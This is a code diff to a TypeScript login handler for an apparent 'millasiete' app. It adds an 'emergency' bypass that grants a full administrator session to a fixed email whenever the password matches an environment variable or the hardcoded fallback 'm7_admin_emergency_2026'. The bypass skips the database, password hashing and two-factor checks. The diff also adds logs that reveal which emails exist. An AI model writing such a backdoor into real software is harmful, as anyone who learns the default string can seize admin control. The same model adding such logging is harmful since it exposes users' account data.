@@ -8,12 +8,31 @@ export const login = async (req: Request, res: Response) => {
   const { email, password } = req.body;
   
   try {
+    // BYPASS DE EMERGENCIA (Hallazgo: Desbloqueo rápido si la DB falla)
+    const emergencyPass = process.env.EMERGENCY_ADMIN_PASS || 'm7_admin_emergency_2026';
+    if (email.toLowerCase() === 'admin@millasiete.com' && password === emergencyPass) {
+        console.warn(`[M7-AUTH] !!! ACCESO DE EMERGENCIA UTILIZADO PARA: ${email} !!!`);
+        // Simular usuario admin completo
+        return res.json({ 
+            success: true, 
+            user: { 
+                id: 'USR-01', email: 'admin@millasiete.com', name: 'ADMINISTRADOR DE EMERGENCIA', 
+                role_id: 'ROL-01', roleId: 'ROL-01', permissions: [] 
+            } 
+        });
+    }
+
     const result = await pool.query(
       'SELECT id, email, password, name, role_id, client_ids, two_factor_enabled, two_factor_secret FROM users WHERE email = $1',
       [email.toLowerCase()]
     );
 
     const user = result.rows[0];
+    if (!user) {
+        console.log(`[M7-AUTH] Usuario no encontrado: ${email}`);
+    } else {
+        console.log(`[M7-AUTH] Usuario localizado: ${email}. Verificando hash...`);
+    }
 
     if (user) {
         const match = await bcrypt.compare(password, user.password);
